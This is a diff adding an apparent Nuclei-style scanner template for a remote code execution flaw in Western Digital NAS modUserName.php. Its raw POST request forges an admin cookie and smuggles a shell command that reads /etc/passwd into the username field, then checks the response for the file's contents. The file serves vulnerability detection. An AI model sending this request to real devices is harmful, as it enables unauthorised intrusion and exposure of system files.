@@ -1,0 +1,32 @@
+id: poc-yaml-west-nas-modusername-php-rce
+info:
+  name: Western Digital NAS modUserName.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, western_digital, nas
+http:
+  - raw:
+      - |
+        POST /web/php/modUserName.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: username=test; isAdmin=1
+        Content-Type: application/x-www-form-urlencoded
+
+        oldName=someuser&username=newuser"; cat /etc/passwd; %23
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "Cannot modify header information"
+          - "modUserName.php"
+      - type: word
+        part: body
+        words:
+          - "<html>"
+        negative: true
